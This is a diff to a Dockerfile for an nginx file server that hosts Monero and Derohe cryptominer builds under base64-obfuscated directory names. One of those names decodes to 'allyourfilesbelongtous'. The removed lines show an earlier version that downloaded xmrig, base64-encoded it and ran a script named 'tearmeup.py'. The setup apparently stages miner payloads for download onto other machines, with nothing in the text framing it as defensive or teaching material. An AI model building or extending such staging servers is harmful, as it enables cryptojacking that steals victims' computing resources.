@@ -1,20 +1,30 @@
+# Stage 1: Build Monero
+FROM monerominer AS monero1
+
+# Stage 2: Build Derohe miner
+FROM deroheminer AS deroheminer1
+
+# Final Stage: Build fileserver
 FROM nginx:latest
 RUN apt update -y
 RUN apt install wget python3 -y
-COPY fileserver/fileshare.yourdomain.com.conf /etc/nginx/conf.d/fileshare.yourdomain.com.conf
-RUN mkdir -p /opt/fileshare.yourdomain.com/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux
+
+ARG FQDN=fileshare.yourdomain.com
+
+COPY fileserver/$FQDN.conf /etc/nginx/conf.d/$FQDN.conf
+RUN mkdir -p /opt/$FQDN/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux
+RUN mkdir -p /opt/$FQDN/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux/bW9uZXJv
+RUN mkdir -p /opt/$FQDN/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux/ZGVyb2hl
 #RUN mkdir -p /usr/share/nginx/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux
 
 #COPY # Remember to copy /usr/share/nginx/html into 
 
-WORKDIR /opt/fileshare.yourdomain.com/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux
+WORKDIR /opt/$FQDN/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux
 #WORKDIR /usr/share/nginx/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux
-RUN wget -c https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz -O /tmp/xmrig-6.18.1-linux-static-x64.tar.gz
-RUN tar -zxvf /tmp/xmrig-6.18.1-linux-static-x64.tar.gz
-RUN cp xmrig-6.18.1/xmrig .
-RUN rm -rf xmrig-6.18.1/
-RUN cat xmrig| base64 > xmrig.b64
-COPY fileserver/tearmeup.py .
-RUN chmod 755 tearmeup.py
-RUN ./tearmeup.py
-RUN rm xmrig && rm xmrig.b64 && rm tearmeup.py
+
+# Copy artifacts
+COPY --from=monero1 /root/build/ /opt/$FQDN/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux/bW9uZXJv
+COPY --from=deroheminer1 /root/build/ /opt/$FQDN/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux/ZGVyb2hl
+
+RUN chmod -R 644 /opt/$FQDN/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux/bW9uZXJv/
+RUN chmod -R 644 /opt/$FQDN/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux/ZGVyb2hl/
